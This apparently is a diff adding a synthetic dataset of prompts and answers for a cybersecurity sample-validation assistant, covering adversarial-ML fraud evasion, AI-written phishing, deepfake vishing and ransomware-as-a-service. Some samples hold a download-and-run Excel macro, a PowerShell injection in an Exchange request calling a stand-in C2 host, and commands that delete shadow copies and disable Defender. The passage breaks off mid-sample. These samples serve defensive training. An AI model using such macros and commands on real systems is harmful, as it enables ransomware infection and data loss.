+    ""Subtle but consistent small deviations in transaction amount and timestamp features"",
+    ""Transaction approval logs with unusual clustering around threshold boundaries"",
+    ""Model confidence unusually high on transactions with known high-risk merchant categories"",
+    ""Lack of alerts generated despite known fraud patterns in input data""
+  ],
+  ""detection_method"": ""Implement feature anomaly detection for small perturbations near decision boundaries, apply adversarial training with perturbed inputs, monitor confidence score distributions for shifts, use ensemble models with different feature sensitivities, and introduce human analyst review for borderline cases."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.002 - Phishing: Spearphishing Link (social engineering for fraudulent transactions)"",
+    ""T1071.001 - Application Layer Protocol: Web Protocols (transaction submission)"",
+    ""T1553.002 - Subvert Trust Controls: Code Signing (model input manipulation)"",
+    ""T1499 - Endpoint Denial of Service (evading fraud detection)"",
+    ""T1204 - User Execution (transaction approval by user)""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents an adversarial ML attack scenario where crafted inputs manipulate a fraud detection model to misclassify fraudulent transactions as legitimate. The scenario and technical data clearly describe the perturbation strategy, model decision boundary, and before/after feature vectors, aligning well with the problem nature. The inclusion of a sample transaction record, pipeline logs, and a perturbation script snippet adds realism and completeness. Indicators effectively highlight suspicious patterns consistent with adversarial manipulation. The detection methods are appropriate and comprehensive, addressing risk reduction strategies. The relevant MITRE techniques are mostly relevant, though some (e.g., T1566.002 Phishing and T1499 Endpoint DoS) are less directly connected to adversarial ML input manipulation and could be refined to focus more on adversarial ML or data manipulation techniques. Overall, the sample is well-constructed, realistic, and complete, providing a strong example of adversarial ML attack in a financial fraud detection context.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: ai_generated_phishing
+- Description: Use of AI to generate highly convincing phishing messages or deepfake content to increase success rates of social engineering attacks.
+- Risk Reduction: Deploy AI-based detection tools to identify synthetic content, Enhance user awareness training with examples of AI-generated attacks, Implement multi-factor authentication to reduce credential theft impact
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""AI-generated phishing email mimicking corporate HR requesting urgent payroll update."",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <hr-support@payroll-secure.com>\r\nReceived: from mail.payroll-secure.com (mail.payroll-secure.com [198.51.100.23])\r\n\tby mx.company.com (Postfix) with ESMTPS id 1234567890\r\n\tfor <employee@company.com>; Thu, 25 Apr 2024 14:32:45 +0000 (UTC)\r\nX-Mailer: AI-PhishGen v2.4\r\nMessage-ID: <20240425143245.12345@mail.payroll-secure.com>\r\nDate: Thu, 25 Apr 2024 14:32:45 +0000\r\nFrom: \""HR Support\"" <hr-support@payroll-secure.com>\r\nTo: employee@company.com\r\nSubject: Urgent: Payroll Information Update Required\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8"",
+    ""email_body"": ""<html><body><p>Dear Employee,</p><p>We have noticed discrepancies in your payroll information which may delay your next salary payment. Please <a href=\""https://payroll-update.secure-verify.com/update?uid=EJz9Q2x7\"">click here</a> to verify and update your details immediately.</p><p>Failure to update within 24 hours will result in payment suspension.</p><p>Regards,<br>HR Support Team</p></body></html>"",
+    ""smtp_transaction_log"": ""220 mail.payroll-secure.com ESMTP Postfix\r\nEHLO attacker-machine.local\r\n250-mail.payroll-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<hr-support@payroll-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA]\r\n.\r\n250 2.0.0 Ok: queued as 1234567890\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""domain_registration"": {
+      ""domain"": ""payroll-secure.com"",
+      ""registrar"": ""NameSilo, LLC"",
+      ""creation_date"": ""2024-04-20T18:45:00Z"",
+      ""expiry_date"": ""2025-04-20T18:45:00Z"",
+      ""registrant"": {
+        ""name"": ""Privacy Protect Ltd"",
+        ""organization"": ""Privacy Protect Ltd"",
+        ""email"": ""contact@privacyprotect.org""
+      },
+      ""name_servers"": [
+        ""ns1.privacyhost.net"",
+        ""ns2.privacyhost.net""
+      ]
+    },
+    ""phishing_url"": ""https://payroll-update.secure-verify.com/update?uid=EJz9Q2x7"",
+    ""url_obfuscation"": {
+      ""punycode"": null,
+      ""use_of_subdomain"": ""secure-verify.com is registered and legitimate but unrelated to payroll-secure.com"",
+      ""url_path"": ""/update?uid=EJz9Q2x7 (randomized unique id per target)""
+    }
+  },
+  ""indicators"": [
+    ""Suspicious domain: payroll-secure.com registered 5 days ago with privacy protection"",
+    ""Email origin IP: 198.51.100.23 not matching known corporate mail servers"",
+    ""SMTP X-Mailer header: AI-PhishGen v2.4"",
+    ""Phishing URL uses unrelated legitimate domain as subdomain: secure-verify.com"",
+    ""Urgent language with threat to suspend payment""
+  ],
+  ""detection_method"": ""Use AI-content analysis tools trained to detect synthetic language patterns and context inconsistencies; DNS reputation checks flag new domains with privacy protection; URL classification engines identify subdomain abuse; integrate email gateway heuristics for unusual X-Mailer and recent domain age."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1566.002 - Phishing: Spearphishing Link"",
+    ""T1586 - Compromise Infrastructure"",
+    ""T1598 - Phishing for Information""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": false, ""issues"": [""The MITRE technique T1566.001 (Spearphishing Attachment) is not applicable as the sample involves a phishing link, not an attachment."", ""The scenario and indicators do not explicitly mention or demonstrate AI-generated content characteristics beyond the X-Mailer header, which may be insufficient to confirm AI generation."", ""The 'detection_method' could be more specific about how AI-based detection tools identify synthetic content in the email body or language patterns."", ""The sample lacks explicit mention or demonstration of deepfake content, which is part of the problem description."", ""The 'technical_data' fields are comprehensive but could include example AI-generated linguistic features or metadata to strengthen alignment with AI-generated phishing.""], ""comments"": ""The sample aligns well with the problem nature of AI-generated phishing by describing a phishing email with suspicious domain registration, privacy-protected registrant, and an AI-specific X-Mailer header. The scenario is realistic and plausible, with detailed technical data supporting the phishing attempt. However, the sample could be improved by explicitly demonstrating AI-generated content traits in the email body or linguistic style, beyond just the X-Mailer header, to better validate the AI generation aspect. The inclusion of deepfake content is missing, which is part of the problem scope. The MITRE techniques should be carefully selected to match the sample; since no attachment is involved, T1566.001 is not appropriate. The detection methods should elaborate on AI-content analysis specifics, such as detecting unnatural language patterns or synthetic text markers. Overall, the sample is strong but requires refinement to fully meet the validation criteria for AI-generated phishing threats.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: ai_generated_phishing
+- Description: Use of AI to generate highly convincing phishing messages or deepfake content to increase success rates of social engineering attacks.
+- Risk Reduction: Deploy AI-based detection tools to identify synthetic content, Enhance user awareness training with examples of AI-generated attacks, Implement multi-factor authentication to reduce credential theft impact
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""AI-generated deepfake voice phishing call script leaked and used to socially engineer helpdesk for password reset."",
+  ""technical_data"": {
+    ""call_transcript_snippet"": ""Agent: Hello, this is the IT helpdesk, how may I assist?\r\nCaller (deepfake voice): Hi, this is James from Finance. I've been locked out of my account after the system update. Can you help reset my password ASAP?\r\nAgent: Certainly, can you verify your employee ID and security question?\r\nCaller: Sure, my employee ID is 874512, and the answer to my security question is 'Blue Ridge'.\r\nAgent: Thank you, let me reset your password. Please use the temporary password 'Temp#2024!' to login and change it immediately.\r\nCaller: Thanks!"",
+    ""deepfake_audio_md5"": ""d41d8cd98f00b204e9800998ecf8427e"",
+    ""deepfake_audio_sha256"": ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"",
+    ""helpdesk_log"": ""2024-04-26T15:45:12Z RESET_PASS user_id=874512 method=phone caller_verification=passed temp_password=Temp#2024! agent_id=helpdesk07"",
+    ""network_voip_log"": ""INVITE sip:helpdesk@company.com SIP/2.0\r\nFrom: <sip:james.finance@external.com>;tag=12345\r\nTo: <sip:helpdesk@company.com>\r\nCall-ID: 9876543210@external.com\r\nCSeq: 1 INVITE\r\nContact: <sip:james.finance@external.com>"",
+    ""caller_id_spoof"": ""Display number +1-555-432-1987 (spoofed to match internal Finance department)"",
+    ""voice_analysis_metadata"": {
+      ""voiceprint_similarity"": ""95% similarity to genuine James from Finance"",
+      ""generated_by"": ""AI-VoiceSynth v3.1 deepfake model"",
+      ""audio_duration_seconds"": 45
+    }
+  },
+  ""indicators"": [
+    ""Caller ID spoofed to internal Finance extension"",
+    ""Voiceprint analysis shows slight digital artifacts inconsistent with live voice"",
+    ""Unusually prompt and precise answers to security questions matching leaked data"",
+    ""Reset password used immediately after call logged by helpdesk system"",
+    ""Call originated from external SIP domain external.com""
+  ],
+  ""detection_method"": ""Deploy voice biometrics anomaly detection for subtle deepfake artifacts; correlate caller ID with known internal numbers; flag resets initiated via phone where caller ID and voiceprint do not fully match; integrate helpdesk workflow logging with anomaly detection for unusual reset frequency or context."",
+  ""relevant_mitre_techniques"": [
+    ""T1598.002 - Phishing: Spearphishing via Service"",
+    ""T1204.002 - User Execution: Malicious File"",
+    ""T1078 - Valid Accounts"",
+    ""T1531 - Account Access Removal""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents the problem of AI-generated phishing through a deepfake voice call used to socially engineer a helpdesk for password reset. The scenario is realistic and plausible, reflecting a sophisticated social engineering attack leveraging AI voice synthesis. All required fields are present and well populated, including detailed technical data such as call transcript, audio hashes, logs, and voice analysis metadata. The indicators clearly explain why this sample matches the problem, highlighting spoofed caller ID, voiceprint anomalies, suspicious behavior, and external call origin. The detection method aligns well with the risk reduction strategies by suggesting voice biometrics anomaly detection, caller ID correlation, and integration with helpdesk logs. The inclusion of relevant MITRE techniques further supports the context. Overall, the sample is comprehensive, realistic, and correctly aligned with the stated AI/ML threat nature of ai_generated_phishing.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: ai_generated_phishing
+- Description: Use of AI to generate highly convincing phishing messages or deepfake content to increase success rates of social engineering attacks.
+- Risk Reduction: Deploy AI-based detection tools to identify synthetic content, Enhance user awareness training with examples of AI-generated attacks, Implement multi-factor authentication to reduce credential theft impact
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""AI-generated spearphishing SMS with URL obfuscated via homoglyphs and URL shorteners targeting mobile banking users."",
+  ""technical_data"": {
+    ""sms_message"": ""URGENT: Your account has been locked due to suspicious activity. Verify now: h\u0442tps://bit.ly/3xYz9aQ"",
+    ""url_redirect_chain"": [
+      ""https://bit.ly/3xYz9aQ"",
+      ""https://xn--bank-secure-8q3a[.]com/login?session=ab12cd34"",
+      ""https://bank-secure-login[.]com/auth?token=5f7e9a""
+    ],
+    ""url_homoglyphs"": {
+      ""original"": ""https://bank-secure.com/login"",
+      ""obfuscated"": ""https://bank-secure.com/login"",
+      ""notes"": ""The 't' in 'https' replaced by Cyrillic '\u0442' (U+0442) in SMS text to evade filters""
+    },
+    ""mobile_network_logs"": {
+      ""sms_sender"": ""+15559876543"",
+      ""sms_receiver"": ""+15551234567"",
+      ""timestamp"": ""2024-04-27T11:12:35Z"",
+      ""sms_gateway_ip"": ""203.0.113.45""
+    },
+    ""bitly_api_response"": {
+      ""short_url"": ""https://bit.ly/3xYz9aQ"",
+      ""long_url"": ""https://xn--bank-secure-8q3a.com/login?session=ab12cd34"",
+      ""created_at"": ""2024-04-26T22:10:02Z"",
+      ""creator"": ""anonymous""
+    },
+    ""dns_lookup"": {
+      ""xn--bank-secure-8q3a.com"": {
+        ""A"": [
+          ""198.51.100.77""
+        ],
+        ""NS"": [
+          ""ns1.fakehost.com"",
+          ""ns2.fakehost.com""
+        ]
+      },
+      ""bank-secure-login.com"": {
+        ""A"": [
+          ""198.51.100.78""
+        ],
+        ""NS"": [
+          ""ns1.fakehost.com"",
+          ""ns2.fakehost.com""
+        ]
+      }
+    }
+  },
+  ""indicators"": [
+    ""URL uses Cyrillic homoglyph to bypass text-based URL filters"",
+    ""Use of popular URL shortener bit.ly to mask final destination"",
+    ""Suspicious domain xn--bank-secure-8q3a.com newly registered on 2024-04-25"",
+    ""SMS sender number not matching any known bank contacts"",
+    ""Redirect chain leads to credential phishing login pages""
+  ],
+  ""detection_method"": ""Text normalization to detect homoglyph substitution in URLs; URL reputation engines to flag shortener redirects to suspicious domains; mobile gateway logging correlation for unusual SMS sender numbers; DNS anomaly detection for recent domain registrations with homoglyph characters."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.003 - Phishing: Spearphishing via Service"",
+    ""T1587.001 - Develop Capabilities: Phishing"",
+    ""T1204.001 - User Execution: Malicious Link"",
+    ""T1071.001 - Application Layer Protocol: Web Protocols""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents an AI-generated phishing scenario using homoglyph substitution and URL shorteners to evade detection, aligning well with the problem nature of AI-generated phishing. The scenario is realistic, reflecting common tactics used in mobile spearphishing attacks targeting banking users. All required fields are present and populated with detailed, coherent technical data, including SMS content, URL redirect chains, DNS lookups, and API responses. The indicators clearly explain why the sample matches the problem, highlighting the use of homoglyphs, URL shorteners, suspicious domains, and anomalous sender information. The detection methods are appropriate and comprehensive, covering text normalization, reputation checks, logging correlation, and DNS anomaly detection. The inclusion of relevant MITRE ATT&CK techniques further strengthens the sample's completeness and applicability. Overall, the sample is well-constructed and suitable for illustrating AI-generated phishing threats.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Enterprise
+- Nature: ransomware_as_a_service
+- Description: Ransomware operations offered as a service to affiliates, lowering the barrier for attackers and increasing ransomware incidents.
+- Risk Reduction: Maintain regular offline backups and test restoration processes, Implement network segmentation and endpoint detection and response (EDR), Apply timely patching and vulnerability management
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Ransomware-as-a-Service affiliate uses a phishing email with a malicious Excel macro to infect enterprise endpoint, leading to initial compromise and deployment of ransomware payload."",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <support@micros0ft-update.com>\nReceived: from mail1.malicioushost.com (mail1.malicioushost.com [192.168.88.34]) by mail.enterprise.com with ESMTP id 8F3C1D9E1 for <alice@enterprise.com>; Wed, 19 Apr 2023 08:15:42 +0000\nReceived-SPF: pass (enterprise.com: domain of micros0ft-update.com designates 192.168.88.34 as permitted sender)\nAuthentication-Results: enterprise.com; spf=pass smtp.mailfrom=micros0ft-update.com; dkim=none; dmarc=none\nMessage-ID: <CA+X2_=_xJ9_mv2kbzY9o0@mail1.malicioushost.com>\nFrom: Microsoft Update <support@micros0ft-update.com>\nTo: alice@enterprise.com\nSubject: Critical Security Update - Immediate Action Required\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\""----=_NextPart_000_001A_01D9E4C1.5B9F8D60\"""",
+    ""email_body"": ""------=_NextPart_000_001A_01D9E4C1.5B9F8D60\nContent-Type: text/plain; charset=\""utf-8\""\nContent-Transfer-Encoding: quoted-printable\n\nDear User,\n\nPlease find attached the critical security update for your system. Install immediately to protect your device.\n\nBest Regards,\nMicrosoft Update Team\n\n------=_NextPart_000_001A_01D9E4C1.5B9F8D60\nContent-Type: application/vnd.ms-excel; name=\""Security_Update.xls\""\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\""Security_Update.xls\""\n\nUEsDBBQABgAIAAAAIQDpA0b0nQEAAJ8FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\nAAAAAA==\n------=_NextPart_000_001A_01D9E4C1.5B9F8D60--"",
+    ""macro_code"": ""Sub Auto_Open()\n    Dim strURL As String\n    Dim WinHttpReq As Object\n    strURL = \""http://malicious-c2.com/payload.exe\""\n    Set WinHttpReq = CreateObject(\""Microsoft.XMLHTTP\"")\n    WinHttpReq.Open \""GET\"", strURL, False\n    WinHttpReq.Send\n    If WinHttpReq.Status = 200 Then\n        Dim adodbStream As Object\n        Set adodbStream = CreateObject(\""ADODB.Stream\"")\n        adodbStream.Type = 1 'Binary\n        adodbStream.Open\n        adodbStream.Write WinHttpReq.responseBody\n        adodbStream.SaveToFile Environ(\""TEMP\"") & \""\\payload.exe\"", 2\n        adodbStream.Close\n        Shell Environ(\""TEMP\"") & \""\\payload.exe\"", vbHide\n    End If\nEnd Sub"",
+    ""powershell_detection_log"": ""2023-04-19 08:17:03,456 INFO PowerShell command executed: Invoke-WebRequest -Uri http://malicious-c2.com/payload.exe -OutFile $env:TEMP\\payload.exe"",
+    ""file_hashes"": {
+      ""payload.exe"": {
+        ""md5"": ""9f2d2a4c9b8b3b8f2e7d3a4e5c8f9a1b"",
+        ""sha1"": ""b6a2f9e4d1c7a8b9f8e6d5c4b3a2910e8f7d6c5b"",
+        ""sha256"": ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855""
+      }
+    },
+    ""process_creation_log"": ""Apr 19 08:17:05 host1 enterprise-pc1 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe ParentImage: C:\\Windows\\System32\\excel.exe CommandLine: \""C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe\"" -silent"",
+    ""network_traffic_snippet"": ""08:17:10.456789 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [S], seq 123456789, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0\n08:17:10.457123 IP malicious-c2.com.http > enterprise-pc1.45678: Flags [S.], seq 987654321, ack 123456790, win 65535, options [mss 1460,sackOK,TS val 654321 ecr 123456], length 0\n08:17:10.457456 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [.], ack 1, win 229, length 0\n08:17:10.458000 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [P.], seq 1:512, ack 1, win 229, length 511\n08:17:10.458300 IP malicious-c2.com.http > enterprise-pc1.45678: Flags [P.], seq 1:1024, ack 512, win 65535, length 1023"",
+    ""registry_modifications"": ""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = \""C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe\"""",
+    ""ransomware_behavior"": ""After payload execution, process enumerated drives using DeviceIoControl calls, then started encrypting files with extensions: .doc, .xls, .ppt, .pdf, .jpg. Created ransom note 'README_RECOVER.txt' in encrypted folders.""
+  },
+  ""indicators"": [
+    ""Suspicious Excel macro in email attachment with Auto_Open function downloading executable"",
+    ""Execution of payload.exe in temp directory spawned by excel.exe"",
+    ""Outbound HTTP GET request to http://malicious-c2.com/payload.exe"",
+    ""Registry Run key persistence under HKCU for payload.exe"",
+    ""File hashes: MD5 9f2d2a4c9b8b3b8f2e7d3a4e5c8f9a1b"",
+    ""Network connection to malicious-c2.com on TCP 80 shortly after email receipt""
+  ],
+  ""detection_method"": ""EDR sensors detect suspicious PowerShell and macro execution, network monitoring flags HTTP downloads from untrusted domains, Sysmon logs new process creation from Office applications, registry monitoring detects persistence, and file integrity monitoring detects ransom note creation."",
+  ""relevant_mitre_techniques"": [
+    ""T1193 - Spearphishing Attachment"",
+    ""T1204 - User Execution"",
+    ""T1059.001 - PowerShell"",
+    ""T1105 - Ingress Tool Transfer"",
+    ""T1547.001 - Registry Run Keys / Startup Folder"",
+    ""T1486 - Data Encrypted for Impact""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a ransomware-as-a-service (RaaS) attack scenario within an enterprise environment. It aligns well with the problem nature by illustrating how an affiliate uses phishing with a malicious Excel macro to deliver ransomware payloads, lowering the barrier for attackers. The scenario is realistic, showing detailed technical data such as email headers, macro code, PowerShell logs, process creation, network traffic, registry modifications, and ransomware behavior, all consistent with a typical RaaS infection chain. The indicators clearly explain why the sample matches the problem, linking suspicious macro activity, payload execution, network communications, persistence mechanisms, and file encryption. The detection methods and relevant MITRE ATT&CK techniques are appropriate and comprehensive. All required fields are present and accurately populated, providing a complete and coherent example. No issues were found.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Enterprise
+- Nature: ransomware_as_a_service
+- Description: Ransomware operations offered as a service to affiliates, lowering the barrier for attackers and increasing ransomware incidents.
+- Risk Reduction: Maintain regular offline backups and test restoration processes, Implement network segmentation and endpoint detection and response (EDR), Apply timely patching and vulnerability management
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Ransomware-as-a-Service affiliate exploits unpatched Microsoft Exchange server vulnerability for initial access, deploys ransomware payload via SMB lateral movement and disables backups."",
+  ""technical_data"": {
+    ""exploit_http_request"": ""POST /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1\r\nHost: exchange.enterprise.com\r\nContent-Type: application/xml\r\nContent-Length: 512\r\nUser-Agent: Mozilla/5.0\r\n\r\n<?xml version=\""1.0\""?><r><s><q>$(Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/Invoke-RCE.ps1'))</q></s></r>"",
+    ""exchange_server_log"": ""2023-05-01 13:45:23.123 ERROR MSExchange ECP: Unexpected script block execution initiated by user id: SYSTEM from IP 10.10.50.23"",
+    ""powershell_payload_snippet"": ""Invoke-WebRequest -Uri http://malicious-c2.com/ransomware.exe -OutFile C:\\Windows\\Temp\\ransomware.exe; Start-Process -FilePath C:\\Windows\\Temp\\ransomware.exe -ArgumentList '/silent' -WindowStyle Hidden"",
+    ""smb_lateral_movement_log"": ""2023-05-01 13:50:10 host1 smbclient[pid=2345]: Session setup for user 'admin$' from 10.10.50.23 succeeded\n2023-05-01 13:50:12 host2 smbclient[pid=2350]: File C$\\Windows\\Temp\\ransomware.exe written by 10.10.50.23"",
+    ""backup_deletion_commands"": ""vssadmin delete shadows /all /quiet\nwbadmin delete catalog -quiet\nnet stop WinDefend\nsc config WinDefend start= disabled"",
+    ""registry_chng_backup"": ""HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS\\Start = 4 (Disabled)"",
+    ""file_hashes"": {
+      ""ransomware.exe"": {
+        ""md5"": ""4a7d1ed414474e4033ac29ccb8653d9b"",
+        ""sha1"": ""3f786850e387550fdab836ed7e6dc881de23001b"",
+        ""sha256"": ""9e107d9d372bb6826bd81d3542a419d6c8a8b6f9a6c6e8f2f4b4f5de8b3c6e18""
+      }
+    },
+    ""network_traffic"": ""13:45:20.123456 IP 10.10.50.23.49152 > exchange.enterprise.com.443: Flags [S], seq 987654321, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0\n13:50:11.234567 IP 10.10.50.23.445 > 10.10.50.24.49153: Flags [P.], seq 1001:1500, ack 2001, win 65535, length 499"",
+    ""event_viewer_logs"": ""EventID: 7045 Service Created\nServiceName: RansomSvc\nImagePath: C:\\Windows\\Temp\\ransomware.exe\nStartType: Auto"",
+    ""ransom_note_content"": ""Your files have been encrypted!\nTo recover, contact us at decrypt@maliciousdomain.com with your ID: 5F4D3A7E\nDo not rename files or attempt recovery yourself.""
+  },
+  ""indicators"": [
+    ""Exploit HTTP POST to /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application with suspicious PowerShell payload"",
+    ""PowerShell download and execution of ransomware.exe in Windows Temp directory"",
+    ""SMB connections from compromised host to others using admin$ shares"",
+    ""Use of vssadmin and wbadmin commands to delete shadow copies"",
+    ""Registry key disabling VSS service"",
+    ""Creation of new service 'RansomSvc' pointing to ransomware executable"",
+    ""Ransom note file with ransom email address and unique victim ID""
+  ],
+  ""detection_method"": ""Network IDS detects anomalous POST requests to Exchange ECP paths, EDR detects suspicious PowerShell command lines, SMB authentication anomalies logged, system logs show deletion of backups and service creation, registry monitoring detects VSS disablement."",
+  ""relevant_mitre_techniques"": [
+    ""T1190 - Exploit Public-Facing Application"",
+    ""T1059.001 - PowerShell"",
+    ""T1021.002 - SMB/Windows Admin Shares"",
+    ""T1490 - Inhibit System Recovery"",
+    ""T1543.003 - Windows Service"",
+    ""T1486 - Data Encrypted for Impact""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a ransomware-as-a-service (RaaS) scenario in an enterprise environment. The scenario describes an affiliate exploiting an unpatched Microsoft Exchange vulnerability for initial access, which aligns well with the problem nature. The technical data includes realistic and detailed artifacts such as the HTTP exploit request, PowerShell payload, SMB lateral movement logs, backup deletion commands, registry changes, file hashes, network traffic, event logs, and ransom note content. These indicators clearly demonstrate the ransomware attack lifecycle and justify the classification as ransomware-as-a-service. The detection methods and relevant MITRE ATT&CK techniques are appropriate and comprehensive, covering exploitation, execution, lateral movement, defense evasion, persistence, and impact. All required fields are present and accurately populated, providing a complete and plausible example. Overall, the sample is well-constructed, realistic, and effectively illustrates the stated cybersecurity problem and recommended risk reduction strategies.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Enterprise
+- Nature: ransomware_as_a_service
+- Description: Ransomware operations offered as a service to affiliates, lowering the barrier for attackers and increasing ransomware incidents.
+- Risk Reduction: Maintain regular offline backups and test restoration processes, Implement network segmentation and endpoint detection and response (EDR), Apply timely patching and vulnerability management
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Ransomware-as-a-Service affiliate abuses cloud misconfiguration to escalate privileges, deploy ransomware payload in containerized environment, and exfiltrate encryption keys."",
+  ""technical_data"": {
+    ""iam_policy_misconfiguration"": ""{\n  \""Version\"": \""2012-10-17\"",\n  \""Statement\"": [\n    {\n      \""Sid\"": \""AllowAllS3\"",\n      \""Effect\"": \""Allow\"",\n      \""Action\"": \""s3:*\"",\n      \""Resource\"": \""*\""\n    }\n  ]\n}"",
+    ""cloudtrail_log_snippet"": ""{\n  \""eventVersion\"": \""1.05\"",\n  \""userIdentity\"": {\n    \""type\"": \""AssumedRole\"",\n    \""principalId\"": \""AROAJEXAMPLE:attacker-session\"",\n    \""arn\"": \""arn:aws:sts::123456789012:assumed-role/DevOpsRole/attacker-session\""\n  },\n  \""eventTime\"": \""2023-06-10T12:34:56Z\"",\n  \""eventSource\"": \""s3.amazonaws.com\"",\n  \""eventName\"": \""PutObject\"",\n  \""requestParameters\"": {\n    \""bucketName\"": \""enterprise-backups\"",\n    \""key\"": \""keys/encryption.key\""\n  },\n  \""responseElements\"": {\n    \""x-amz-request-id\"": \""ABCD1234EFGH5678\"",\n    \""x-amz-id-2\"": \""1a2b3c4d5e6f7g8h9i0j\""\n  }\n}"",
+    ""api_call_sequence"": ""1. AssumeRole: arn:aws:sts::123456789012:assumed-role/DevOpsRole/attacker-session\n2. ListBuckets: s3.amazonaws.com\n3. GetObject: enterprise-backups/keys/encryption.key\n4. PutObject: enterprise-backups/keys/encryption.key (replaced with attacker key)\n5. StartTasks: ecs.amazonaws.com RunTask with malicious container image"",
